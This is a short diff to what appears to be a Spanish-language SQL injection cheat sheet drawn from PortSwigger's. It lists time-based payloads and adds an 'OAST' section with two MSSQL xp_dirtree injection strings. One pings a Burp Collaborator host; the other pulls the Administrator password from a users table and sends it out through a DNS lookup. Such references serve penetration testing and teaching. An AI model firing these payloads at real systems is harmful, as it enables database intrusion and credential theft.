@@ -67,6 +67,12 @@ PostgreSQL:	SELECT pg_sleep(10) ``` '||(SELECT pg_sleep(10) WHERE (1=1))--```
 
 MySQL:	SELECT SLEEP(10)
 
+## OAST
+
+```
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='Administrator'); exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+```
 
 # Referencias
 - [Burpsuite](https://portswigger.net/web-security/sql-injection/cheat-sheet)
